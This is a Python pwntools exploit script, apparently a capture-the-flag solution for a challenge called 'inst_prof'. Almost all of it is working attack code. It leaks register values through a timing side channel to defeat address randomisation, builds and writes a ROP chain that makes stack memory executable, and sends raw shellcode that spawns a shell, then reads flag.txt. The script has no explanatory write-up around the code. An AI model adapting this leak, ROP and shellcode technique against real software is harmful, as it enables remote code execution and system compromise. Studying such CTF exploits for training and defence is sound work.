from pwn import *
import pwn
import sys
import struct
import numpy as np

context.arch = "amd64"
dict_asm = {}

def asm(ASM):
    if ASM in dict_asm:
        return dict_asm[ASM]
    else:
        code = pwn.asm(ASM)
        dict_asm[ASM] = code
        return code

def execute(ASM):
    CODE = asm(ASM).ljust(4, asm("nop"))
    if len(CODE) > 4:
        print "More than 4 bytes", ASM
        sys.exit()

    con.send(CODE)
    time = con.recv(8)
    return u64(time)

def calibrate():
    """ Gathers sample data to determine good threshold value to distinguish 0 and 1"""
    p2 = log.progress("Gathering Threshold")

    #Reference 0
    execute("xor r14, r14; ret")  
    data_0 = []
    data_1 = []
    for i in range(3):
        data_0.append(execute("sub r12, r14"))
    log.success("0 Bit: %s", str(data_0))

    #Reference 1
    execute("inc r14; ret")
    for i in range(3):
        data_1.append(execute("sub r12, r14"))
    log.success("1 Bit: %s", str(data_1))

    #Compute Threshold
    avg_0 = np.average(data_0)
    avg_1 = np.average(data_1)
    thres = (avg_0 + avg_1) / 2
    log.success("Threshold: %d", thres)
    p2.success()
    return thres

def leak_r15(lowest_bit=0, highest_bit=48):
    """ Value to leak in r15, uses r14 """
    p2 = log.progress("Leaking")
    
    #skip unsued bits
    for n_bit in range(0, lowest_bit):
        execute("shr r15,1; ret")

    #leak
    leak = 0
    for n_bit in range(lowest_bit, highest_bit+1):
        #prepare bitmask
        execute("xor r14, r14")
        execute("inc r14; ret")
        execute("and r14, r15")

        #leak bit
        t = execute("sub r12, r14")
        if t > thres:
            leak |= 1 << n_bit
        p2.status("%u/48 Leak: 0x%x Runtime: %u", n_bit, leak, t)        

        #shift r15
        execute("shr r15,1; ret")

    log.success("Leaked: 0x%x", leak)
    p2.success()
    return leak
        
def write_buff(what):
    """ Write what to *r15 """
    p2 = log.progress("Writing To Stack")
    i = 0
    for c in what:
        p2.status("writing %d/%d", i, len(what))
        i += 1
        execute("movb [r15],0x%02x" % ord(c))
        execute("inc r15; ret")

    p2.success()


#Exploit

con = process("./patched_inst_prof")
#con = remote("inst-prof.ctfcompetition.com", 1337)

#Calibrating Threshold for Leak
con.recvuntil("ready\n")
thres = calibrate()
#thres = 6000 #used for remote due to time restrictions

#Leak
execute("pop r15; push r15")
binary_base = leak_r15(lowest_bit=12,highest_bit=40) | 0x550000000000

execute("mov r15, rdi")
page_old = leak_r15(lowest_bit=12,highest_bit=48)

#Build ROP Chain
alloc_page = binary_base + 0x9f0
pop_rdi = binary_base + 0xbc3
read_n = binary_base + 0xa80
make_page_executable = binary_base + 0xa20
pop_rbx_r12_rbp = binary_base + 0xaab
call_rbx = binary_base + 0xb16

ropchain  = struct.pack("<Q", alloc_page)
ropchain += struct.pack("<Q", pop_rdi)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", read_n)
ropchain += struct.pack("<Q", pop_rdi)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", make_page_executable)
ropchain += struct.pack("<Q", pop_rbx_r12_rbp)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", call_rbx)

#Write ROP Chain
execute("mov r15, rsp; ret")
execute("inc r15")
write_buff(ropchain)

#Trigger ROP Chain
log.success("Execute ROP Chain")
execute("mov r15, rsp; ret")
execute("inc r15")
CODE = asm("mov rsp,r15; ret").ljust(4, asm("nop"))
con.send(CODE)

#Send Shellcode and execute Flag
log.success("Send Shellcode")
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = shellcode + "\x90" * (0x1000 - len(shellcode))
con.send(shellcode)
con.send("cat flag.txt\n")
con.interactive()
